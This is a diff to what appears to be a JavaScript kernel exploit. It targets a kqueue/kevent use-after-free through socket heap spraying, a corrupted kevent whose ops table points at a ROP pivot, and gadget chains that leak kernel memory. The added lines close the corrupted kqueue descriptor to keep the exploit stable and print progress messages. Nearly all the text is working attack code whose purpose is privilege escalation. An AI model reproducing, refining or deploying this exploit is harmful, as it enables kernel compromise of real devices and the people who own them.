@@ -555,6 +555,16 @@ function shooter(gad) {
 
     this.sprayed = socks.length;
     const r = arm();
+    /* neutralise the kqueue immediately -- the corrupted kevent must not
+       survive long enough for the kernel softclock (~10 ms tick) to process
+       it asynchronously while JS scans the leak buffer.  closing the fd
+       triggers kqueue_close which walks the knote list, but the knote's
+       backing object is our spray body whose ops table already points at the
+       ROP pivot; by the time we reach this line the chain has returned and
+       the pivot is no longer in flight, so the close merely drops a stale
+       reference.  the defuse loop in teardown() already guards with
+       if (!f || !inHeap(f)) continue, so the closed fd is harmless there. */
+    sc(S.close, q);
     for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
     say("    window " + this.window.toFixed(2) + " ms for " + socks.length
         + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
@@ -2115,12 +2125,14 @@ async function attempt(ctx, opts) {
     const win = alloc(TUNE.window + 16);
     wipe(win, TUNE.window + 16);
 
+    say("[1] firing first take ...");
     const r = shot.take(function (c) {
       /* round down to the start of the slab, so the window also covers the
          neighbours that sit below the freed object */
       c.gad("rcx"); c.num(14); c.gad("shr"); c.gad("shl");
       c.grab(win.at, TUNE.window);
     });
+    say("[1] take returned " + r + ", scanning " + TUNE.window + " bytes");
 
     const at = function (off) { return qAt(win, off); };
 
